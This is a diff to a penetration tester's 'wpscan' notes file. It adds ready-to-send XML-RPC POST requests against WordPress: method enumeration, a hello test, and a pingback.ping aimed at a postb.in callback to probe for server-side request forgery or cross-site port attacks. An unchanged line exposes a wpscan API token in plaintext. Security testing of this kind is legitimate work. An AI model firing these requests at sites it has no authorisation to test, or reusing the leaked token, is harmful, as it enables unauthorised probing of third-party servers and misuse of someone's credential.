@@ -1,6 +1,52 @@
 wpscan 
 ======
 
+POST /xmlrpc.php HTTP/1.1
+Host: example.com
+Content-Length: 135
+
+<?xml version="1.0" encoding="utf-8"?> 
+<methodCall> 
+<methodName>system.listMethods</methodName> 
+<params></params> 
+</methodCall>
+
+
+
+
+POST /xmlrpc.php HTTP/1.1
+Host: example.com
+Content-Length: 130
+
+<?xml version="1.0" encoding="utf-8"?> 
+<methodCall> 
+<methodName>demo.sayHello</methodName> 
+<params></params> 
+</methodCall>
+
+
+
+POST /xmlrpc.php HTTP/1.1
+Host: example.com
+Content-Length: 303
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param>
+<value><string>https://postb.in/1562017983221-4377199190203</string></value>
+</param>
+<param>
+<value><string>https://example.com/</string></value>
+</param>
+</params>
+</methodCall>
+
+https://shahjerry33.medium.com/cross-site-port-attack-a-strangers-call-c2467f93792f
+
+
+https://youtu.be/5l6vclHbbkg
 
 wpscan api key --api-token  QRc2y3VbXODgLLRDQXDurbhFLaD0q1nxGRlE6Xc2SXI
 
